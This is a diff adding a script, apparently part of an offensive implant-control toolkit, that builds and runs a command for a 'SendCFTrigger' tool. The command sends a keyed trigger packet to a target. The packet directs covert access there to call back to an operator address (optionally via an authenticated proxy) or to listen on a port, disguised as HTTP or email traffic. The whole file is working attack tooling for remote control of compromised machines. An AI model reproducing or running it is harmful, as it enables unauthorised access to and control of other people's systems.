@@ -1,0 +1,175 @@
+@include "_LpHelperFunctions.dsi";
+
+#-------------------------------------------------------------------------------
+# Actually sends the trigger
+#-------------------------------------------------------------------------------
+sub SendTrigger(IN string %params)
+{
+
+	string $toolLoc;
+	if (!_GetLpResourcesDirectory($toolLoc))
+	{
+		return false;
+	}
+	string $arch, $os;
+	_GetCompiledArchLocal($arch);
+	_GetOsFamilyLocal($os);
+	
+	StrCat($toolLoc, "/Pc/Tools/$arch-$os/SendCFTrigger.exe");
+	
+	# create the command line
+	string $args="";
+	StrCat($args, " -target %params{'dstAddr'}");
+	if (defined(%params{'protoDstPort'}))
+	{
+		StrCat($args, " %params{'protoDstPort'}");
+		if (defined(%params{'protoSrcPort'}))
+		{
+			StrCat($args, " %params{'protoSrcPort'}");
+		}
+	}
+
+	if (defined(%params{'finalDstAddr'}) && (%params{'finalDstAddr'} != %params{'dstAddr'}))
+	{
+		# different final dest addr
+		StrCat($args, " -destip %params{'finalDstAddr'}");
+	}
+
+	if (defined(%params{'srcAddr'}) && (%params{'srcAddr'} != "0.0.0.0"))
+	{
+		# specified src addr
+		StrCat($args, " -sourceaddress %params{'srcAddr'}");
+	}
+
+	StrCat($args, " -protocol %params{'protocol'}");
+
+	if (%params{'action'} == "CALLBACK")
+	{
+		StrCat($args, " -callback %params{'actionAddr'}");
+		if (defined(%params{'actionDstPort'}))
+		{
+			StrCat($args, " %params{'actionDstPort'}");
+		}
+		if (defined(%params{'actionSrcPort'}))
+		{
+			StrCat($args, " %params{'actionSrcPort'}");
+		}
+		if (defined(%params{'proxyAddr'}))
+		{
+			StrCat($args, " -proxy %params{'proxyAddr'}");
+			if (defined(%params{'proxyPort'}))
+			{
+				StrCat($args, " %params{'proxyPort'}");
+			}
+			if (defined(%params{'proxyUser'}))
+			{
+				StrCat($args, " \\\"%params{'proxyUser'}\\\"");
+			}
+			if (defined(%params{'proxyPass'}))
+			{
+				StrCat($args, " \\\"%params{'proxyPass'}\\\"");
+			}
+		}
+	}
+	else
+	{
+		StrCat($args, " -listen %params{'actionAddr'} %params{'actionSrcPort'} %params{'actionTime'}");
+		if (defined(%params{'reuseAddr'}))
+		{
+			StrCat($args, " -portsharing %params{'reuseAddr'} %params{'reusePort'}");
+		}
+	}
+
+	if (defined(%params{'redirectAddr'}))
+	{
+		StrCat($args, " -redirect %params{'redirectAddr'} %params{'redirectPort'}");
+	}
+
+	StrCat($args, " -keyfile \\\"%params{'key'}\\\"");
+
+	if (%params{'protocol'} == "ICMP")
+	{
+		StrCat($args, " -icmp-options %params{'icmpType'} %params{'icmpCode'}");
+	}
+	else if (%params{'protocol'} == "TCP")
+	{
+		if (defined(%params{'fullConnect'}))
+		{
+			StrCat($args, " -tcpconnect");
+		}
+		else if (defined(%params{'tcpFlags'}))
+		{
+			StrCat($args, " -tcpflags %params{'tcpFlags'}");
+		}
+	}
+
+	if (defined(%params{'firewall'}) && (%params{'firewall'} != "NONE"))
+	{
+		StrCat($args, " -firewall %params{'firewall'}");
+	}
+		
+	if (defined(%params{'format'}) && (%params{'format'} != "NONE"))
+	{
+		StrCat($args, " -format %params{'format'}");
+		
+		if (%params{'format'} == "HTTP")
+		{
+			StrCat($args, " -action %params{'httpType'}");
+			StrCat($args, " -useragent \\\"%params{'httpAgent'}\\\"");
+			StrCat($args, " -domain \\\"%params{'httpDomain'}\\\"");
+			StrCat($args, " -webpage \\\"%params{'httpPage'}\\\"");  
+		}
+		else
+		{
+			if (defined(%params{'sendTo'}))
+			{
+				StrCat($args, " -send-addresses \\\"%params{'sendTo'}\\\" \\\"%params{'sendFrom'}\\\"");
+			}
+		}
+	}
+
+	if (defined(%params{'id'}))
+	{
+		StrCat($args, " -id %params{'id'}");
+	}
+	if (defined(%params{'timestamp'}))
+	{
+		StrCat($args, " -timestamp \\\"%params{'timestamp'}\\\"");
+	}
+	
+	if (defined(%params{'urCompatible'}))
+	{
+		StrCat($args, " -ur-compatible");
+	}
+
+	# Unhandled options
+	#	[-trailer <value>]
+	#	[-skew <time>]
+	#	[-dnsflags <value>]
+
+	@echo on;
+	if (_IsWindowsLocal())
+	{
+		if (!`local run -command "$toolLoc $args" -redirect -noinput`)
+		{
+			echo("* Failed to send trigger", ERROR);
+			return false;
+		}
+	}
+	else
+	{
+		# the unix version of run cannot currently handle spaces in commands
+		StrCat($args, "; exit");
+		if (!`local run -command "/bin/sh -i" -redirect "$toolLoc $args"`)
+		{
+			echo("* Failed to send trigger", ERROR);
+			return false;
+		}
+	}
+	@echo off;
+	
+	return true;
+	
+}	/* END SendTrigger */
+
+
